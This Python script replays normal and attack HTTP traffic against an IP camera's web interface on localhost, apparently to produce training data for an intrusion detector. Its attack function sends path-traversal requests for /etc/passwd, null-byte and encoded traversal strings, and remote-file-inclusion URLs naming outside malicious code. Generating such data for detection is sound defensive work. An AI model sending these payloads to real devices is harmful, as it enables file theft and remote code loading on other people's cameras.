from time import sleep
import requests

def simulate_initial_connection():
    my_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    }
    r = requests.get(url="http://localhost:80", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/admin.html", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "*/*",
        "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Referer": "http://146.136.47.202/web/admin.html"
    }
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/param.cgi?cmd=getserverinfo", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Referer": "http://146.136.47.202/web/admin.html"
    }
    
    r = requests.get(url="http://localhost:80/web/mainpage.html", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/blank.html", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Accept"] = "image/avif,image/webp,*/*"
    r = requests.get(url="http://localhost:80/web/upcam-img/favicon.ico", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Accept"] = "*/*"
    my_headers["Referer"] = "http://146.136.47.202/web/mainpage.html"
    r = requests.get(url="http://localhost:80/web/js/language.js", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/param.cgi?cmd=getvencattr&cmd=getvencattr&cmd=getsetupflag&cmd=getaudioflag&cmd=getvideoattr&cmd=getimageattr&cmd=getinfrared&cmd=getserverinfo&cmd=getdevices&-chn=11&-chn=12", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/param.cgi?cmd=gethttpport&cmd=getrtmpattr", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Accept"] = "text/css,*/*;q=0.1"
    r = requests.get(url="http://localhost:80/web/ip3css/newIP3.css", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/upcam-css/overrule.css", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/upcam-css/upcam-additional.css", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Accept"] = "*/*"
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/param.cgi?cmd=getntpattr&cmd=getmdattr&cmd=getserverinfo&cmd=getourddnsattr&cmd=get3thddnsattr&cmd=getinfrared&cmd=getplanrecattr&cmd=getp2pattr&cmd=getwirelessattr&cmd=getnetattr&cmd=getstreamnum&cmd=getaudioflag&cmd=getdevtype&cmd=getservertime", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/upcam-js/swfobject.js", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/upcam-js/upcam-recommend.js", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/upcam-js/upcam-additional.js", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/upcam-ptz/upcam-ptz.js", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/ip3js/jquery-1.9.1.min.js", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Accept"] = "image/avif,image/webp,*/*"
    r = requests.get(url="http://localhost:80/web/upcam-img/multi_1.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Accept"] = "*/*"
    r = requests.get(url="http://localhost:80/web/ip3js/newIP3.js", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Accept"] = "image/avif,image/webp,*/*"
    r = requests.get(url="http://localhost:80/web/upcam-img/multi_4.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Accept"] = "*/*"
    r = requests.get(url="http://localhost:80/web/js/base64.js", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Accept"] = "image/avif,image/webp,*/*"
    r = requests.get(url="http://localhost:80/web/upcam-img/multi_9.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/upcam-img/pt.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/upcam-img/pt_in.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Accept"] = "*/*"
    r = requests.get(url="http://localhost:80/web/lang/german/language.js", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/lang/german/upcam-additional-language.js", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/js-264/ffmpeg.js", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["X-Requested-With"] = "XMLHttpRequest"
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/param.cgi?cmd=setvencattr&-chn=12&-fps=1024", auth=("admin", "admin"), headers=my_headers)
    print(r)
    del my_headers["X-Requested-With"]
    r = requests.get(url="http://localhost:80/web/js-264/commonff.js", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/js-264/pcm-player.js", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/js-264/video-player.js", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/js-264/webgl-player.js", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Accept"] = "image/avif,image/webp,*/*"
    del my_headers["Connection"]
    r = requests.get(url="http://localhost:80/web/upcam-img/multi_1.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/upcam-img/multi_4.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/upcam-img/multi_9.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/upcam-img/pt.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/upcam-img/pt_in.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Connection"] = "keep-alive"
    my_headers["Referer"] = "http://146.136.47.202/web/ip3css/newIP3.css"
    r = requests.get(url="http://localhost:80/web/upcam-img/top_left.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["If-Modified-Since"] = "Thu, 16 Jan 2014 15:07:12 STD"
    my_headers["If-None-Match"] = "\"52d7e790.3f2\""
    r = requests.get(url="http://localhost:80/web/upcam-img/top_center.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    del my_headers["If-Modified-Since"]
    del my_headers["If-None-Match"]
    my_headers["Referer"] = "http://146.136.47.202/web/mainpage.html"
    r = requests.get(url="http://localhost:80/upcam-img/logo-cyclone-hd-s.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Referer"] = "http://146.136.47.202/web/ip3css/newIP3.css"
    r = requests.get(url="http://localhost:80/web/upcam-img/top_menu.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Referer"] = "http://146.136.47.202/web/upcam-css/overrule.css"
    r = requests.get(url="http://localhost:80/web/upcam-img/livemenu_icon.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Referer"] = "http://146.136.47.202/web/ip3css/newIP3.css"
    r = requests.get(url="http://localhost:80/web/upcam-img/top_right.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Referer"] = "http://146.136.47.202/web/upcam-css/overrule.css"
    r = requests.get(url="http://localhost:80/web/upcam-img/bottom_left_16-9.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["If-Modified-Since"] = "Thu, 04 Aug 2016 17:33:40 STD"
    my_headers["If-None-Match"] = "\"57a36e64.434\""
    r = requests.get(url="http://localhost:80/web/upcam-img/bottom_center_16-9.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    del my_headers["If-Modified-Since"]
    del my_headers["If-None-Match"]
    r = requests.get(url="http://localhost:80/web/upcam-img/live_btn.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/upcam-img/set_btn.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["If-Modified-Since"] = "Thu, 12 Jun 2014 01:47:38 STD"
    my_headers["If-None-Match"] = "\"5398f8aa.475\""
    r = requests.get(url="http://localhost:80/web/upcam-img/banner_left.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    del my_headers["If-Modified-Since"]
    del my_headers["If-None-Match"]
    r = requests.get(url="http://localhost:80/web/upcam-img/banner_bg.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/upcam-img/banner_btn.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/upcam-img/banner_right.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/upcam-img/bottom_right_16-9.png", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["X-Requested-With"] = "XMLHttpRequest"
    my_headers["Referer"] = "http://146.136.47.202/web/mainpage.html"
    my_headers["Accept"] = "*/*"
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/param.cgi?cmd=preset&-act=get", auth=("admin", "admin"), headers=my_headers)
    print(r)
    del my_headers["X-Requested-With"]
    r = requests.get(url="http://localhost:80/web/js-264/hi_h264dec.js", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/js-264/NetThread.js", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/js-264/decworker.js", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Referer"] = "http://146.136.47.202/web/js-264/hi_h264dec.js"
    r = requests.get(url="http://localhost:80/web/js-264/commonff.js", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Referer"] = "http://146.136.47.202/web/js-264/NetThread.js"
    r = requests.get(url="http://localhost:80/web/js-264/commonff.js", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Referer"] = "http://146.136.47.202/web/js-264/decworker.js"
    r = requests.get(url="http://localhost:80/web/js-264/g711.js", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Referer"] = "http://146.136.47.202/web/js-264/hi_h264dec.js"
    r = requests.get(url="http://localhost:80/web/js-264/libffmpeg.js", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Sec-WebSocket-Version"] = "13"
    my_headers["Sec-WebSocket-Extensions"] = "permessage-deflate"
    my_headers["Sec-WebSocket-Key"] = "98GHZaoAJ12byc1/pNU1yg=="
    my_headers["Connection"] = "keep-alive, Upgrade"
    my_headers["Pragma"] = "no-cache"
    my_headers["Cache-Control"] = "no-cache"
    my_headers["Upgrade"] = "websocket"
    del my_headers["Referer"]
    r = requests.get(url="http://localhost:80/websocket", auth=("admin", "admin"), headers=my_headers)
    print(r)
    del my_headers["Sec-WebSocket-Version"]
    del my_headers["Sec-WebSocket-Extensions"]
    del my_headers["Sec-WebSocket-Key"]
    del my_headers["Pragma"]
    del my_headers["Cache-Control"]
    del my_headers["Upgrade"]
    my_headers["Connection"] = "keep-alive"
    my_headers["Referer"] = "http://146.136.47.202/web/js-264/hi_h264dec.js"
    r = requests.get(url="http://localhost:80/web/js-264/libffmpeg.wasm", auth=("admin", "admin"), headers=my_headers)
    print(r)

def simulate_moving():
    my_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "*/*",
        "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Referer": "http://146.136.47.202/web/mainpage.html",
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "keep-alive"
    }
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?-step=0&-act=right&-speed=45", auth=("admin", "admin"), headers=my_headers)
    print(r)
    sleep(1)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?-step=0&-act=stop&-speed=45", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?-step=0&-act=left&-speed=45", auth=("admin", "admin"), headers=my_headers)
    print(r)
    sleep(1)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?-step=0&-act=stop&-speed=45", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?-step=0&-act=up&-speed=45", auth=("admin", "admin"), headers=my_headers)
    print(r)
    sleep(1)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?-step=0&-act=stop&-speed=45", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?-step=0&-act=down&-speed=45", auth=("admin", "admin"), headers=my_headers)
    print(r)
    sleep(1)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?-step=0&-act=stop&-speed=45", auth=("admin", "admin"), headers=my_headers)
    print(r)


def simulate_snap():
    my_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Referer": "http://146.136.47.202/web/mainpage.html",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache"
    }
    r = requests.get(url="http://localhost:80/web/tmpfs/snap.jpg", auth=("admin", "admin"), headers=my_headers)
    print(r)


def simulate_post():
    r = requests.post("http://localhost:80/post_test", data="test_data")
    print(r)

def simulate_initial_connection_attack():
    my_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    }
    r = requests.get(url="http://localhost:80", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/admin.html", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "*/*",
        "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Referer": "http://146.136.47.202/web/admin.html"
    }
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/param.cgi?cmd=getserverinfo", auth=("admin", "admin"),
                     headers=my_headers)
    print(r)
    my_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Referer": "http://146.136.47.202/web/admin.html"
    }

    r = requests.get(url="http://localhost:80/web/mainpage.html", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/blank.html", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Accept"] = "image/avif,image/webp,*/*"
    r = requests.get(url="http://localhost:80/web/upcam-img/favicon.ico", auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Accept"] = "*/*"
    my_headers["Referer"] = "http://146.136.47.202/web/mainpage.html"
    r = requests.get(url="http://localhost:80/web/js/language.js", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(
        url="http://localhost:80/web/cgi-bin/hi3510/param.cgi?cmd=getvencattr&cmd=getvencattr&cmd=getsetupflag&cmd=getaudioflag&cmd=getvideoattr&cmd=getimageattr&cmd=getinfrared&cmd=getserverinfo&cmd=getdevices&-chn=11&-chn=12",
        auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/param.cgi?cmd=gethttpport&cmd=getrtmpattr",
                     auth=("admin", "admin"), headers=my_headers)
    print(r)
    my_headers["Accept"] = "text/css,*/*;q=0.1"
    r = requests.get(url="http://localhost:80/web/ip3css/newIP3.css", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/upcam-css/overrule.css", auth=("admin", "admin"), headers=my_headers)
    print(r)

def simulate_moving_attack():
    my_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "*/*",
        "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Referer": "http://146.136.47.202/web/mainpage.html",
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "keep-alive"
    }
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?-step=infinity&-act=right&-speed=100", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?user=bob&authz_token=1234&expire=1500000000", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?-step=0&-act=stop&-speed=45", auth=("admin", "password"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?file=report.pdf", auth=("admin", "password"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?file=../../../../some dir/some file", auth=("admin", "password"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?file=/etc/passwd", auth=("admin", "password"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?page=http://other-site.com.br/other-page.htm/malicius-code.php", auth=("admin", "password"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?page=http://google.com.br/index.htm/malicius-code.php", auth=("admin", "password"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?page=http://other-site.com.br/other-page.htm/malicius-code.php", auth=("admin", "password"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?page=http://google.com.br/index.htm/malicius-code.php", auth=("admin", "password"), headers=my_headers)
    print(r)
    sleep(1)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?file=main.cgi", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=list", auth=("admin", "admin"), headers=my_headers)
    print(r)
    sleep(1)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=2", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=test", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=/var/www/html/get.php", auth=("admin", "admin"), headers=my_headers)
    print(r)
    sleep(1)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=/var/www/html/admin/get.inc", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=/etc/passwd", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=/var/www/html/get.php", auth=("admin", "admin"), headers=my_headers)
    print(r)
    sleep(1)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=/../.../.../admin/etc.inc", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=/../passwd", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?home=ptzctrl.cgi", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?page=../scripts/foo.cgi%00txt", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?page=../scripts/ptzctrl.cgi%00txt", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/..%u2216..%u2216someother/ptzctrl.cgi?page=../scripts/ptzctrl.cgi%00txt", auth=("admin", "admin"), headers=my_headers)
    print(r)
    r = requests.get(url="http://localhost:80/web/cgi-bin/../../../../../etc/passwd", auth=("admin", "admin"), headers=my_headers)
    print(r)

def test():
    my_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "*/*",
        "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Referer": "http://146.136.47.202/web/mainpage.html",
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "keep-alive"
    }
    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=2", auth=("admin", "admin"), headers=my_headers)
    print(r)

TRAIN_NORMAL_TRAFFIC = True

if TRAIN_NORMAL_TRAFFIC:
    #simulate_initial_connection()
    simulate_moving()
else:
    simulate_moving_attack()
#simulate_snap()
#simulate_post()